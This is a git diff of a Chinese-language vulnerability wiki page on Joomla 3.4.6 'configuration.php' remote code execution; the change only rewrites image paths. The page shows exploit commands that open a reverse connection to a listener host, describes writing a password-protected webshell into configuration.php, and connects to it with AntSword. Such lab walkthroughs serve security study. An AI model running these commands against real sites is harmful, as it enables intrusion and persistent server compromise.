@@ -22,7 +22,7 @@ https://github.com/ianxtianxt/Joomla-3.4.6\-\--configuration.php-Remote-Code-Exe
 
     python3 test.py -t http://127.0.0.1:8080/
 
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId25.png)
+![](./.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId25.png)
 
 显示"Vulnerable"证明存在漏洞
 
@@ -30,12 +30,12 @@ https://github.com/ianxtianxt/Joomla-3.4.6\-\--configuration.php-Remote-Code-Exe
 
     python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121
 
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId26.png)
+![](./.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId26.png)
 
 执行成功
 
-并在"configuration.php"写入**随机密码**的一句话木马![](/Users/aresx/Documents/VulWiki/.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId27.png)上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi
+并在"configuration.php"写入**随机密码**的一句话木马![](./.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId27.png)上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi
 
 蚁剑链接测试
 
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId28.png)
+![](./.resource/Joomla3.4.6-'configuration.php'RemoteCodeExecution/media/rId28.png)
